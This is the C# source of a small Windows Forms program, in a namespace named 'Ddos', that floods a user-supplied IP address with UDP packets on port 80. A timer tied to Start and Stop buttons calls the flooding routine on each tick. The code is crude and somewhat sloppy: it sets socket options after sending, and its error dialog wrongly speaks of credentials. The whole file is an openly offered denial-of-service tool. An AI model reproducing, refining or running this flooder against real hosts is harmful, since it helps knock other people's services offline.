using System;
using System.Drawing;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Ddos
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void StartBtn_Click(object sender, EventArgs e)
        {
            StartBtn.BackColor = Color.Green;
            StopBtn.BackColor = Color.DimGray;
            timer1.Start();
        }

        private void StopBtn_Click(object sender, EventArgs e)
        {
            StopBtn.BackColor = Color.Red;
            StartBtn.BackColor = Color.DimGray;
            timer1.Stop();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            DataFlooding();
        }

        public void DataFlooding()
        {
            UdpClient client = new UdpClient();
            IPAddress ipAdress = IPAddress.Parse(IpText.Text);

            try
            {
                client.Connect(ipAdress,80);
                byte[] sendBytes = Encoding.ASCII.GetBytes(dataTextBox.Text);
                client.Send(sendBytes, sendBytes.Length);
                client.AllowNatTraversal(true);
                client.DontFragment = true;
            }
            catch
            {
                MessageBox.Show("Wrong Credentials...",
                    "Something went wrong.",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            dataTextBox.ReadOnly = false;
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }
    }
}
